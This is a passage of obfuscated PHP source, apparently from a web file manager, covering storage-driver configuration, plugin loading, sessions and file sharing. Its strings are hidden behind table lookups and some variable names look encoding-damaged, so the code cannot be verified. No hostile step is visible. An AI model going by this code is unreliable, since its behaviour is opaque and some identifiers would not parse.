$êûŸ®ç =& $_SERVER[Ùæõ‰Ï’]; if (!$ƒùó‚á) { return; } $‹¡Èœ±• = Model($êûŸ®ç[831])->config(); if ($‹¡Èœ±•[$êûŸ®ç[1751]] != $êûŸ®ç[91] || $‹¡Èœ±•[$êûŸ®ç[835]] != $ƒùó‚á) { return; } $”ìÊ¨€ = Model($êûŸ®ç[853])->get($êûŸ®ç[866]); $”ìÊ¨€ = json_decode($”ìÊ¨€, !0); if (!$”ìÊ¨€) { return; } $”ìÊ¨€[$êûŸ®ç[835]] = $Æœ´³ã·; Model($êûŸ®ç[853])->set(array($êûŸ®ç[866] => $”ìÊ¨€)); } public function checkPwd($î¿•ÁÑı, &$Â–Ô¤¿Š) { $¥˜¬…© =& $_SERVER[Ùæõ‰Ï’]; if (empty($Â–Ô¤¿Š[$¥˜¬…©[6]])) { return; } $Ú™·şà¡ = json_decode($Â–Ô¤¿Š[$¥˜¬…©[6]], !0); $İüÄ¼’õ = $¥˜¬…©[12]; $µšŠ¾œü = array($¥˜¬…©[2310], $¥˜¬…©[2311], $¥˜¬…©[978]); foreach ($µšŠ¾œü as $Â¾Ë•ğ¦) { if (isset($Ú™·şà¡[$Â¾Ë•ğ¦])) { $İüÄ¼’õ = $Â¾Ë•ğ¦; break; } } if (!$İüÄ¼’õ) { return; } $ˆšŠ€Ú = $this->getConfig($î¿•ÁÑı); $”‰ã‰Â¸ = $ˆšŠ€Ú[$İüÄ¼’õ]; $şİùÍÛ¹ = $Ú™·şà¡[$İüÄ¼’õ]; if ($şİùÍÛ¹ == str_repeat($¥˜¬…©[220], strlen($”‰ã‰Â¸))) { $Ú™·şà¡[$İüÄ¼’õ] = $”‰ã‰Â¸; $Â–Ô¤¿Š[$¥˜¬…©[6]] = json_encode($Ú™·şà¡); } else { if ($şİùÍÛ¹ != $”‰ã‰Â¸) { $Â–Ô¤¿Š[$¥˜¬…©[2309]] = $¥˜¬…©[91]; } } } public function checkConfig(&$÷›·…êû, $²Ê½æƒó = false) { $äÛñâ´ =& $_SERVER[Ùæõ‰Ï’]; $´áâ´¾Ê = strtolower($÷›·…êû[$äÛñâ´[98]]); $Şó®öî¾ = json_decode($÷›·…êû[$äÛñâ´[6]], !0); foreach ($Şó®öî¾ as $â¡²ˆ¶ß => $•ÚÉ¡±) { if (is_string($•ÚÉ¡±)) { $Şó®öî¾[$â¡²ˆ¶ß] = trim($•ÚÉ¡±); } } $Şó®öî¾[$äÛñâ´[2312]] = rand_string(6); $ÒÌÇÑÎ³ = $GLOBALS[$äÛñâ´[6]][$äÛñâ´[92]][$äÛñâ´[908]]; $Åç÷¾Õğ = isset($ÒÌÇÑÎ³[$´áâ´¾Ê]) ? $ÒÌÇÑÎ³[$´áâ´¾Ê] : ucfirst($´áâ´¾Ê); $€¿Ï×ú = $äÛñâ´[77] . $Åç÷¾Õğ; if (!$Åç÷¾Õğ || !class_exists($€¿Ï×ú)) { if ($²Ê½æƒó) { return LNG($äÛñâ´[2313]); } write_log(array($äÛñâ´[2314], $÷›·…êû, get_caller_info()), $äÛñâ´[215]); show_json(LNG($äÛñâ´[2313]), !1, $÷›·…êû); } $­ÇØğÈ‚ = new $€¿Ï×ú($Şó®öî¾); if (in_array($´áâ´¾Ê, $­ÇØğÈ‚->objectDriver)) { try { if (!$­ÇØğÈ‚->isBucketCors() && !$­ÇØğÈ‚->setBucketCors()) { $õËÕ¬áœ = LNG($äÛñâ´[2315]); $õËÕ¬áœ .= $äÛñâ´[2316] . LNG($äÛñâ´[2317]); } } catch (Exception $Ôùàèãœ) { $õËÕ¬áœ = $Ôùàèãœ->getMessage(); } if (isset($õËÕ¬áœ)) { return $this->_parseError($õËÕ¬áœ, $´áâ´¾Ê, $²Ê½æƒó); } if ($´áâ´¾Ê == $äÛñâ´[68] && !$­ÇØğÈ‚->checkRegion()) { return $this->_parseError(LNG($äÛñâ´[2318]), $´áâ´¾Ê, $²Ê½æƒó); } } $úŒÒéŒÓ = rtrim($Şó®öî¾[$äÛñâ´[1275]], $äÛñâ´[8]) . $äÛñâ´[8]; $¿ƒó ´ = $­ÇØğÈ‚->getPath($úŒÒéŒÓ . $äÛñâ´[1279]); try { if ($´áâ´¾Ê == $äÛñâ´[109]) { $­ÇØğÈ‚->mkdir($úŒÒéŒÓ); } $ûäİØ×· = $­ÇØğÈ‚->mkfile($¿ƒó ´); if (!$ûäİØ×·) { $õËÕ¬áœ = LNG($äÛñâ´[2315]); } } catch (Exception $Ôùàèãœ) { $õËÕ¬áœ = $Ôùàèãœ->getMessage(); } if (isset($õËÕ¬áœ)) { return $this->_parseError($õËÕ¬áœ, $´áâ´¾Ê, $²Ê½æƒó); } $Şó®öî¾[$äÛñâ´[1275]] = $úŒÒéŒÓ; $÷›·…êû[$äÛñâ´[6]] = json_encode($Şó®öî¾); $÷›·…êû[$äÛñâ´[98]] = $Åç÷¾Õğ; return !0; } private function _parseError($ü¯Æù“, $¹íü¸²Ù, $áæŞÊ¥™ = false) { $ï±ŠŠÊÅ =& $_SERVER[Ùæõ‰Ï’]; if ($¹íü¸²Ù == $ï±ŠŠÊÅ[68] && stripos($ü¯Æù“, $ï±ŠŠÊÅ[2319])) { $çÆÜğÅÍ = explode($ï±ŠŠÊÅ[10], $ü¯Æù“); $ÑÂª‘òİ = isset($çÆÜğÅÍ[1]) ? $çÆÜğÅÍ[1] : $ï±ŠŠÊÅ[12]; $˜êÉÛ§– = array($ï±ŠŠÊÅ[2320] => LNG($ï±ŠŠÊÅ[2321]), $ï±ŠŠÊÅ[2322] => LNG($ï±ŠŠÊÅ[2323])); if (isset($˜êÉÛ§–[$ÑÂª‘òİ])) { $ü¯Æù“ = $˜êÉÛ§–[$ÑÂª‘òİ]; } } if (stripos($ü¯Æù“, $ï±ŠŠÊÅ[2324]) === 0) { $™Éæ‰‹Ï = strpos($ü¯Æù“, $ï±ŠŠÊÅ[178]); if ($™Éæ‰‹Ï === !1) { $™Éæ‰‹Ï = strpos($ü¯Æù“, $ï±ŠŠÊÅ[4]); } if ($™Éæ‰‹Ï !== !1) { $ü¯Æù“ = substr($ü¯Æù“, $™Éæ‰‹Ï + 1); } } $ü¯Æù“ = LNG($ï±ŠŠÊÅ[1282]) . $ü¯Æù“; if ($áæŞÊ¥™) { return $ü¯Æù“; } show_json($ü¯Æù“, !1); } public function driverListSystem() { $ªêÜ¾±Ê =& $_SERVER[Ùæõ‰Ï’]; $š±—¯½ = parent::listData(); $©ğĞ’ò— = array(); foreach ($š±—¯½ as $­»™œå¬) { unset($­»™œå¬[$ªêÜ¾±Ê[231]], $­»™œå¬[$ªêÜ¾±Ê[88]]); $­»™œå¬[$ªêÜ¾±Ê[6]] = json_decode($­»™œå¬[$ªêÜ¾±Ê[6]], !0); $©ğĞ’ò—[] = $­»™œå¬; } return $©ğĞ’ò—; } public function defaultDriver() { $©Ä™»§ =& $_SERVER[Ùæõ‰Ï’]; $¤‡…Ú’Ó = parent::listData(); $›ïôõ‰ü = array_filter_by_field($¤‡…Ú’Ó, $©Ä™»§[37], 1); $›ïôõ‰ü = $›ïôõ‰ü[0]; if ($›ïôõ‰ü) { $›ïôõ‰ü[$©Ä™»§[6]] = json_decode($›ïôõ‰ü[$©Ä™»§[6]], !0); } return $›ïôõ‰ü; } public function driverInfo($Ë…Ã¸õ) { $ç ËèêØ =& $_SERVER[Ùæõ‰Ï’]; $İ‘û¡½× = array_to_keyvalue(parent::listData(), $ç ËèêØ[475]); if (!isset($İ‘û¡½×[$Ë…Ã¸õ])) { return !1; } $á–Æ÷éÊ = $İ‘û¡½×[$Ë…Ã¸õ]; $á–Æ÷éÊ[$ç ËèêØ[6]] = json_decode($á–Æ÷éÊ[$ç ËèêØ[6]], !0); return $á–Æ÷éÊ; } public function remove($ÄÜÁ¬¹¶) { $this->removeShareItems($ÄÜÁ¬¹¶); return parent::remove($ÄÜÁ¬¹¶); } public function removeWithFile($÷äı•Ş, $êøƒÕ°, $³úäÕƒ‰, $ ‡¾ìƒ‡ = false) { $‡ößÌß” =& $_SERVER[Ùæõ‰Ï’]; $©çÆŠ¼æ = array($‡ößÌß”[900] => $÷äı•Ş); $Ú´ôşçù = Model($‡ößÌß”[544])->where($©çÆŠ¼æ)->count(); $±Ùéà¥Õ = Model($‡ößÌß”[544])->where($©çÆŠ¼æ)->sum($‡ößÌß”[79]); $Ìã˜ú§û = $êøƒÕ° . $‡ößÌß”[2325] . $÷äı•Ş; $ÎÃÄá¢ = LNG($êøƒÕ° == $‡ößÌß”[620] ? $‡ößÌß”[2326] : $‡ößÌß”[2327]); $Òš®Œ¯… = new TaskFileTransfer($Ìã˜ú§û, $‡ößÌß”[215], $Ú´ôşçù, $ÎÃÄá¢ . $‡ößÌß”[462] . $³úäÕƒ‰[$‡ößÌß”[32]] . $‡ößÌß”[214] . $÷äı•Ş); $Òš®Œ¯…->task[$‡ößÌß”[846]] = (double) $±Ùéà¥Õ; $ÄÅöŸÃİ = KodIO::defaultDriver(); $½§Ü­¥Ş = $ÄÅöŸÃİ[$‡ößÌß”[475]]; $üÕÌìÛ = $ÒÂÁ–¼ª = $¡©œÎÇı = array(); $Ãõ³¡¿ñ = Model($‡ößÌß”[230])->where($©çÆŠ¼æ)->field($‡ößÌß”[2328])->select(); foreach ($Ãõ³¡¿ñ as $¯üçî³ª) { $şªá€¯« = $¯üçî³ª[$‡ößÌß”[541]]; if ($ ‡¾ìƒ‡) { $ÒÂÁ–¼ª[] = $şªá€¯«; continue; } $İöÊ´Íæ = $¯üçî³ª[$‡ößÌß”[87]]; $‚Ûë’ò° = get_path_father($İöÊ´Íæ); $¡©œÎÇı[] = $‚Ûë’ò°; $‚Ûë’ò° = str_replace("\173\x69\x6f\72{$÷äı•Ş}\x7d\x2f", "\173\x69\x6f\x3a{$½§Ü­¥Ş}\175\x2f", $‚Ûë’ò°); if (!IO::exist($İöÊ´Íæ)) { $üÕÌìÛ[] = $şªá€¯«; $Òš®Œ¯…->updateFileEnd($¯üçî³ª[$‡ößÌß”[32]], $¯üçî³ª[$‡ößÌß”[79]]); write_log($‡ößÌß”[2329] . $İöÊ´Íæ, $‡ößÌß”[1911]); continue; } $öµŒşı = IO::move($İöÊ´Íæ, $‚Ûë’ò°, REPEAT_RENAME); if (!$öµŒşı) { $ÒÂÁ–¼ª[] = $şªá€¯«; $Òš®Œ¯…->updateFileEnd($¯üçî³ª[$‡ößÌß”[32]], $¯üçî³ª[$‡ößÌß”[79]]); write_log($‡ößÌß”[2330] . $İöÊ´Íæ, $‡ößÌß”[1911]); continue; } $©çÆŠ¼æ = array($‡ößÌß”[541] => $şªá€¯«); $²ÏÜ¨Îù = array($‡ößÌß”[900] => $½§Ü­¥Ş, $‡ößÌß”[87] => $öµŒşı); Model($‡ößÌß”[230])->where($©çÆŠ¼æ)->save($²ÏÜ¨Îù); } $ùæøâ¸‘ = $Òš®Œ¯…->task; if (!$ ‡¾ìƒ‡) { Cache::set($Ìã˜ú§û, $ùæøâ¸‘); } $Òš®Œ¯…->end(); $üÕÌìÛ = array_unique($üÕÌìÛ); $ÒÂÁ–¼ª = array_unique($ÒÂÁ–¼ª); if (!$ ‡¾ìƒ‡ && ($üÕÌìÛ || $ÒÂÁ–¼ª)) { $Èà¤ğÒ¯ = array(); if ($üÕÌìÛ) { $Èà¤ğÒ¯[] = sprintf(LNG($‡ößÌß”[2331]), count($üÕÌìÛ)); } if ($ÒÂÁ–¼ª) { $Èà¤ğÒ¯[] = sprintf(LNG($‡ößÌß”[2332]), count($ÒÂÁ–¼ª)); } $Èà¤ğÒ¯ = sprintf(LNG($‡ößÌß”[2333]), implode($‡ößÌß”[2334], $Èà¤ğÒ¯)) . $‡ößÌß”[2335] . date($‡ößÌß”[2336]) . $‡ößÌß”[2337]; if ($êøƒÕ° == $‡ößÌß”[1948]) { $Èà¤ğÒ¯ .= $‡ößÌß”[2338] . LNG($‡ößÌß”[2339]); } $ùæøâ¸‘[$‡ößÌß”[1277]] = $Èà¤ğÒ¯; Cache::set($Ìã˜ú§û, $ùæøâ¸‘); unset($³úäÕƒ‰[$‡ößÌß”[6]]); $«·ÜÄ¶± = array($‡ößÌß”[475] => $÷äı•Ş, $‡ößÌß”[2217] => $‡ößÌß”[620], $‡ößÌß”[32] => $³úäÕƒ‰[$‡ößÌß”[32]], $‡ößÌß”[1300] => $³úäÕƒ‰); Hook::trigger($‡ößÌß”[1792], array($‡ößÌß”[1300] => $«·ÜÄ¶±, $‡ößÌß”[1310] => !0)); show_json($Èà¤ğÒ¯, !1, 100111); } if ($êøƒÕ° == $‡ößÌß”[620]) { return !0; } if ($üÕÌìÛ || $ÒÂÁ–¼ª) { $ä¸ô“é» = array_merge($üÕÌìÛ, $ÒÂÁ–¼ª); $ä¸ô“é» = array_filter(array_unique($ä¸ô“é»)); $this->removeByFileID($ä¸ô“é»); } if ($¡©œÎÇı) { $¡©œÎÇı = array_filter(array_unique($¡©œÎÇı)); foreach ($¡©œÎÇı as $İöÊ´Íæ) { $¾³»‰° = IO::has($İöÊ´Íæ, !0); if (!$¾³»‰°[$‡ößÌß”[239]] && !$¾³»‰°[$‡ößÌß”[240]]) { IO::remove($İöÊ´Íæ); } } } return $this->remove($÷äı•Ş); } private function removeByFileID($×Âö = array()) { $»º¼Ì¿€ =& $_SERVER[Ùæõ‰Ï’]; if (empty($×Âö)) { return; } $Ãğê…ü« = array($»º¼Ì¿€[541] => array($»º¼Ì¿€[7], $×Âö)); $’Œ®Üò× = Model($»º¼Ì¿€[1430])->where($Ãğê…ü«)->field($»º¼Ì¿€[193])->select(); if (!$’Œ®Üò×) { return Model($»º¼Ì¿€[544])->remove($×Âö); } $’Œ®Üò× = array_to_keyvalue($’Œ®Üò×, $»º¼Ì¿€[12], $»º¼Ì¿€[193]); foreach ($’Œ®Üò× as $İÍ¤ø¤´) { Model($»º¼Ì¿€[907])->removeNow($İÍ¤ø¤´, !1); } } private function removeShareItems($¹ˆÈá­®) { $¤à’Ú– =& $_SERVER[Ùæõ‰Ï’]; $ÎÆ÷ = "\173\x69\x6f\72{$¹ˆÈá­®}\175\57"; $§¾´²ßÈ = array($¤à’Ú–[193] => 0, $¤à’Ú–[1270] => array($¤à’Ú–[459], "{$ÎÆ÷}\x25")); $‡÷íğ½ = Model($¤à’Ú–[1959])->where($§¾´²ßÈ)->field($¤à’Ú–[665])->select(); if (empty($‡÷íğ½)) { return; } $ğíßòİŞ = array_to_keyvalue($‡÷íğ½, $¤à’Ú–[12], $¤à’Ú–[665]); Model($¤à’Ú–[664])->remove($ğíßòİŞ); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\x2e\114\x69\147\150\164\x41\x70\x70"; public $modelType = "\123\x79\163\164\145\x6d\x4f\x70\164\x69\x6f\x6e"; public $field = array("\156\141\155\145", "\x67\x72\x6f\165\x70", "\x64\x65\163\143", "\143\157\x6e\x74\145\x6e\164"); public function listData($²¼¾Í©¼ = false, $€ÆĞğ³ = "\155\x6f\144\151\x66\171\x54\x69\x6d\x65", $æ„³û§ = true) { return parent::listData($²¼¾Í©¼, $€ÆĞğ³, $æ„³û§); } public function remove($ºµñÓ–¢) { $¬ÁÑ÷ÕÚ = $this->findByName($ºµñÓ–¢); if (!$¬ÁÑ÷ÕÚ) { return !1; } return parent::remove($¬ÁÑ÷ÕÚ[$_SERVER[Ùæõ‰Ï’][475]]); } public function add($ößÍÁß¦) { if ($this->findByName($ößÍÁß¦[$_SERVER[Ùæõ‰Ï’][32]])) { return !1; } return parent::insert($ößÍÁß¦); } public function update($ñû³šÉ¸, $şÃñ§ğ¤) { $¼Â¼Ÿúó =& $_SERVER[Ùæõ‰Ï’]; $»½…“± = $this->findByName($ñû³šÉ¸); $Ìµ•…Û€ = $this->findByName($şÃñ§ğ¤[$¼Â¼Ÿúó[32]]); if (!$»½…“± || $Ìµ•…Û€ && $Ìµ•…Û€[$¼Â¼Ÿúó[475]] != $»½…“±[$¼Â¼Ÿúó[475]]) { return !1; } return parent::update($»½…“±[$¼Â¼Ÿúó[475]], $şÃñ§ğ¤); } } goto bœ½ƒù‡‹²; e½ÆÙ³Ğ÷‘: class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\x2e\160\154\165\147\151\156\114\x69\x73\164"; public $field = array("\156\x61\155\x65", "\x73\164\141\x74\x75\163", "\x72\x65\147\x69\x65\x73\164", "\x63\x6f\x6e\146\151\147"); public function loadList($ú‘å®Èø = false) { $¬²‘áú” = array_to_keyvalue($this->listData(), $_SERVER[Ùæõ‰Ï’][32]); if ($ú‘å®Èø) { return $¬²‘áú”[$ú‘å®Èø]; } return $¬²‘áú”; } public function init() { $Ùš´†’¶ =& $_SERVER[Ùæõ‰Ï’]; Hook::trigger($Ùš´†’¶[2103]); $óâ¥¥òÒ = $this->loadPluginList(); foreach ($óâ¥¥òÒ as $‡›ô–êß => $ëÙ…×´†) { $„£šÉÜ = $this->appAllow($‡›ô–êß, $ëÙ…×´†); if (!$„£šÉÜ) { continue; } foreach ($ëÙ…×´†[$Ùš´†’¶[2104]] as $ãá÷åà‰ => $êóÇØÓ•) { Hook::bind($ãá÷åà‰, $êóÇØÓ•); } } Hook::trigger($Ùš´†’¶[2105]); Hook::trigger(ACTION); } public function appAllow($­’Œ­Š, $ÛÜÛÅ‹¤, $º‰ì‰Ü = true) { $¦úè‘„ =& $_SERVER[Ùæõ‰Ï’]; $í¾¯í±¹ = PLUGIN_DIR . $­’Œ­Š . $¦úè‘„[2106]; if (!is_array($ÛÜÛÅ‹¤) || !is_array($ÛÜÛÅ‹¤[$¦úè‘„[2104]]) || $ÛÜÛÅ‹¤[$¦úè‘„[833]] != 1 || !is_file($í¾¯í±¹)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$¦úè‘„[6]][$¦úè‘„[2107]] || !$GLOBALS[$¦úè‘„[6]][$¦úè‘„[2108]]) { return !0; } $‹ÜËäà÷ = explode($¦úè‘„[50], strtolower($GLOBALS[$¦úè‘„[6]][$¦úè‘„[2108]])); return in_array(strtolower($­’Œ­Š), $‹ÜËäà÷) ? !1 : !0; } if ($º‰ì‰Ü && !Action($¦úè‘„[2109])->checkAuth($­’Œ­Š)) { return !1; } return !0; } public function unInstall($ğ­ğíóš) { $Ã²¾Àè =& $_SERVER[Ùæõ‰Ï’]; $óå–³¥ = $this->loadList($ğ­ğíóš); if (file_exists(PLUGIN_DIR . $ğ­ğíóš)) { Hook::apply($ğ­ğíóš . $Ã²¾Àè[2110]); } $this->remove($óå–³¥[$Ã²¾Àè[475]]); } public function changeStatus($˜ŒŒşÚœ, $òèàÈ†ó) { $…¯¾î° =& $_SERVER[Ùæõ‰Ï’]; $”Š£ÃéÉ = $this->loadList($˜ŒŒşÚœ); if ($òèàÈ†ó) { Hook::apply($˜ŒŒşÚœ . $…¯¾î°[2111]); } $this->update($”Š£ÃéÉ[$…¯¾î°[475]], array($…¯¾î°[2112] => $òèàÈ†ó)); } public function appRegist($‹„Ó®û, $ŸÑ¬œçÀ) { $ãØ«”Ä… =& $_SERVER[Ùæõ‰Ï’]; $¤Ûş›î” = $this->loadList($‹„Ó®û); if ($¤Ûş›î”) { $this->update($¤Ûş›î”[$ãØ«”Ä…[475]], array($ãØ«”Ä…[2104] => $ŸÑ¬œçÀ)); } else { $çòêØ„á = array($ãØ«”Ä…[32] => $‹„Ó®û, $ãØ«”Ä…[2104] => $ŸÑ¬œçÀ, $ãØ«”Ä…[833] => 0, $ãØ«”Ä…[6] => $this->getConfigDefault($‹„Ó®û)); $this->insert($çòêØ„á); } } public function getConfigDefault($éæîñÚÏ) { $–®¨ÊË¼ =& $_SERVER[Ùæõ‰Ï’]; $œÜîäÄÃ = array(); $­»ø£¦¼ = $this->getPackageJson($éæîñÚÏ); if (!$­»ø£¦¼ && is_array($­»ø£¦¼[$–®¨ÊË¼[2113]])) { return $œÜîäÄÃ; } foreach ($­»ø£¦¼[$–®¨ÊË¼[2113]] as $¶ßÍÃ…¿ => $¨Üã˜š†) { if (!isset($¨Üã˜š†[$–®¨ÊË¼[450]]) || isset($œÜîäÄÃ[$¶ßÍÃ…¿])) { continue; } $œÜîäÄÃ[$¶ßÍÃ…¿] = $¨Üã˜š†[$–®¨ÊË¼[450]]; } return $œÜîäÄÃ; } public function getPackageJson($Ş­²Òƒ–) { return Hook::apply($Ş­²Òƒ– . $_SERVER[Ùæõ‰Ï’][2114]); } public function getConfig($å“Ìˆ€ƒ, $ÄÒ‘¨Ÿ¡ = false) { $õÓ“ü“Ë =& $_SERVER[Ùæõ‰Ï’]; $Š®Ğ„åµ = array(); $ÂšÒğú§ = $this->loadList($å“Ìˆ€ƒ); if ($ÂšÒğú§ && is_array($ÂšÒğú§[$õÓ“ü“Ë[6]])) { $Š®Ğ„åµ = $ÂšÒğú§[$õÓ“ü“Ë[6]]; } if (!$Š®Ğ„åµ || $ÄÒ‘¨Ÿ¡) { $Š®Ğ„åµ = $this->getConfigDefault($å“Ìˆ€ƒ); } return $Š®Ğ„åµ; } public function setConfig($éÒÑèÀ, $õëÍÛª¢ = false) { $âÍÄØš“ =& $_SERVER[Ùæõ‰Ï’]; $Üäê‡Ñ÷ = $this->loadList($éÒÑèÀ); if (!$Üäê‡Ñ÷) { return !1; } $ºµùîĞå = $Üäê‡Ñ÷[$âÍÄØš“[6]]; if ($õëÍÛª¢ == !1) { $ºµùîĞå = array(); $õëÍÛª¢ = $this->getConfigDefault($éÒÑèÀ); } foreach ($õëÍÛª¢ as $ÀÄşğìÌ => $æ¿¥Î‡) { $ºµùîĞå[$ÀÄşğìÌ] = is_string($æ¿¥Î‡) ? trim($æ¿¥Î‡) : $æ¿¥Î‡; } $this->update($Üäê‡Ñ÷[$âÍÄØš“[475]], array($âÍÄØš“[6] => $ºµùîĞå)); } public function viewList() { $¨¢’×í =& $_SERVER[Ùæõ‰Ï’]; $Õ§üŞ‡š = $this->loadList(); $this->pluginScan($Õ§üŞ‡š); $Õ§üŞ‡š = $this->loadPluginList(); $êİôøßé = array(); foreach ($Õ§üŞ‡š as $ªƒôƒÊ => $•ˆ«ı„½) { $ûåÄÏÏ = $•ˆ«ı„½; unset($•ˆ«ı„½[$¨¢’×í[2104]], $•ˆ«ı„½[$¨¢’×í[6]]); $ª¹”£½Ö = PLUGIN_DIR . $•ˆ«ı„½[$¨¢’×í[32]] . $¨¢’×í[2106]; if (!is_file($ª¹”£½Ö)) { continue; } $şªš§Øê = Hook::apply($•ˆ«ı„½[$¨¢’×í[32]] . $¨¢’×í[2114]); if (!is_array($şªš§Øê)) { continue; } $êİôøßé[$ªƒôƒÊ] = array_merge($•ˆ«ı„½, $şªš§Øê); if ($ûåÄÏÏ[$¨¢’×í[6]][$¨¢’×í[1695]] != $şªš§Øê[$¨¢’×í[1669]]) { Hook::apply($•ˆ«ı„½[$¨¢’×í[32]] . $¨¢’×í[2111]); $ûåÄÏÏ[$¨¢’×í[6]][$¨¢’×í[1695]] = $şªš§Øê[$¨¢’×í[1669]]; $this->update($•ˆ«ı„½[$¨¢’×í[475]], array($¨¢’×í[6] => $ûåÄÏÏ[$¨¢’×í[6]])); } } return $êİôøßé; } private function loadPluginList() { $³Ğ¢‚±• =& $_SERVER[Ùæõ‰Ï’]; $ì“ÍÉ„ = $this->loadList(); if (strtolower(MOD) == $³Ğ¢‚±•[2115]) { return $ì“ÍÉ„; } $˜¨„÷¤¿ = Hook::trigger($³Ğ¢‚±•[2116], $ì“ÍÉ„); if ($ì“ÍÉ„ && !$˜¨„÷¤¿) { die; } return $˜¨„÷¤¿ ? $˜¨„÷¤¿ : $ì“ÍÉ„; } private function pluginScan($Ë‰À©ı) { $àùŒ÷Ô =& $_SERVER[Ùæõ‰Ï’]; recursion_dir(PLUGIN_DIR, $›ìÄÀÂ„, $ıĞ‘üÏ‹, 0); foreach ($›ìÄÀÂ„ as $Ó«Û™üæ) { $±»¯¹ = get_path_this($Ó«Û™üæ); if (isset($Ë‰À©ı[$±»¯¹]) || !file_exists($Ó«Û™üæ . $àùŒ÷Ô[2117]) || !file_exists($Ó«Û™üæ . $àùŒ÷Ô[2106])) { continue; } Hook::apply($±»¯¹ . $àùŒ÷Ô[2111]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\145\155\137\163\145\163\x73\151\x6f\156"; public function get($©“Šäø) { $ŒÊÆ²Ôµ =& $_SERVER[Ùæõ‰Ï’]; $õ¡›ç = $this->where(array($ŒÊÆ²Ôµ[2118] => $©“Šäø))->find(); if (!is_array($õ¡›ç)) { return !1; } return $õ¡›ç[$ŒÊÆ²Ôµ[171]]; } public function set($æ•ƒƒšÀ, $ÌÄ¦Ôô¬, $²‰”ıíÅ = 3600) { $ÄÀ¬Ÿ— =& $_SERVER[Ùæõ‰Ï’]; $ïÅ¼ùŞ = array($ÄÀ¬Ÿ—[2118] => $æ•ƒƒšÀ, $ÄÀ¬Ÿ—[2018] => $ÌÄ¦Ôô¬, $ÄÀ¬Ÿ—[2119] => $²‰”ıíÅ + time()); if (Session::get($ÄÀ¬Ÿ—[2120])) { $ïÅ¼ùŞ[$ÄÀ¬Ÿ—[1781]] = Session::get($ÄÀ¬Ÿ—[2120]); } else { $ïÅ¼ùŞ[$ÄÀ¬Ÿ—[1781]] = 0; } if ($this->get($æ•ƒƒšÀ)) { return $this->where(array($ÄÀ¬Ÿ—[2118] => $æ•ƒƒšÀ))->save($ïÅ¼ùŞ); } else { return $this->add($ïÅ¼ùŞ, array(), !0); } } public function remove($×Ø“¹ñ–) { return $this->where(array($_SERVER[Ùæõ‰Ï’][2118] => $×Ø“¹ñ–))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ùæõ‰Ï’][2121] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\141\x72\x65"; protected $dataAuto = array(array("\155\157\144\x69\146\x79\124\151\155\x65", "\x74\151\155\x65", "\151\156\x73\145\162\x74\x2c\165\160\144\141\164\145", "\146\x75\156\x63\164\151\x6f\156"), array("\143\162\x65\141\164\x65\124\x69\x6d\x65", "\164\151\x6d\145", "\x69\x6e\163\145\162\x74", "\x66\165\156\143\x74\x69\x6f\x6e"), array("\157\160\x74\151\x6f\156\163", '', "\151\x6e\163\x65\162\x74\54\165\160\x64\x61\164\x65\54\163\x65\154\x65\143\x74", "\152\163\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($¹ŒËÇöø) { $ş“‘åá— =& $_SERVER[Ùæõ‰Ï’]; $å¾ç„¡´ = isset($¹ŒËÇöø[0]) ? $¹ŒËÇöø[0] : !1; return array($ş“‘åá—[2122] => array(USER_ID, $ş“‘åá—[2123]), $ş“‘åá—[2063] => array($å¾ç„¡´, $ş“‘åá—[2124])); } protected function listSimple() { $ºäôãÎ = array($_SERVER[Ùæõ‰Ï’][1781] => USER_ID); $Œ‘¢‹ã¶ = $this->field($this->fieldList)->where($ºäôãÎ)->select(); return $Œ‘¢‹ã¶ ? $Œ‘¢‹ã¶ : array(); } protected function getInfo($÷×‡¹¬, $½­İ‘ = false) { $æïò±Ó =& $_SERVER[Ùæõ‰Ï’]; if ($½­İ‘) { return $this->_getShareInfo(array($æïò±Ó[665] => $÷×‡¹¬)); } $˜Ç’€‰ = $this->cacheFunctionGet($æïò±Ó[2065], $÷×‡¹¬); return $˜Ç’€‰; } public function getInfoByHash($’şí«Û›) { return $this->_getShareInfo(array($_SERVER[Ùæõ‰Ï’][2125] => $’şí«Û›)); } public function getInfoByPath($ëôà©´ä) { $ß‘•Æ­ï =& $_SERVER[Ùæõ‰Ï’]; $ûÀµ¢¡ = array($ß‘•Æ­ï[1781] => USER_ID, $ß‘•Æ­ï[193] => $ëôà©´ä); return $this->_getShareInfo($ûÀµ¢¡); } public function getInfoBySourcePath($‰ÇïŠºì) { $§¦ÂĞ«Ÿ =& $_SERVER[Ùæõ‰Ï’]; $ı¥õŸÎ± = array($§¦ÂĞ«Ÿ[1781] => USER_ID, $§¦ÂĞ«Ÿ[1270] => $‰ÇïŠºì); return $this->_getShareInfo($ı¥õŸÎ±); } private function _getShareInfo($İÎ¾˜·) { $¼ß¢¬ë­ =& $_SERVER[Ùæõ‰Ï’]; $‡„„»çœ = $this->where($İÎ¾˜·)->find(); if (!$‡„„»çœ) { return !1; } $İÎ¾˜· = array($¼ß¢¬ë­[665] => $‡„„»çœ[$¼ß¢¬ë­[665]]); $ óöäšö = $¼ß¢¬ë­[2126]; $â€ÃÁü» = Model($¼ß¢¬ë­[666])->order($¼ß¢¬ë­[475])->field($ óöäšö)->where($İÎ¾˜·)->select(); if ($‡„„»çœ[$¼ß¢¬ë­[193]] == $¼ß¢¬ë­[228]) { $‡„„»çœ[$¼ß¢¬ë­[90]] = IO::info($‡„„»çœ[$¼ß¢¬ë­[1270]]); } else { $‡„„»çœ[$¼ß¢¬ë­[90]] = Model($¼ß¢¬ë­[1430])->pathInfo($‡„„»çœ[$¼ß¢¬ë­[193]]); } $‡„„»çœ[$¼ß¢¬ë­[2127]] = $â€ÃÁü»; return $‡„„»çœ; } protected function getInfoAuth($ãò‚ÎÛñ) { $­­ƒƒ­” =& $_SERVER[Ùæõ‰Ï’]; $Òƒó¨ôá = $this->getInfo($ãò‚ÎÛñ); if ($Òƒó¨ôá[$­­ƒƒ­”[1781]] == USER_ID) { $Òƒó¨ôá[$­­ƒƒ­”[487]] = $Òƒó¨ôá[$­­ƒƒ­”[90]][$­­ƒƒ­”[487]]; } else { $Òƒó¨ôá[$­­ƒƒ­”[487]] = Model($­­ƒƒ­”[567])->authMake($Òƒó¨ôá[$­­ƒƒ­”[2127]]); } return $Òƒó¨ôá; } protected function listData($öîâùµ = null, $‚¢¿¤ = 300) { 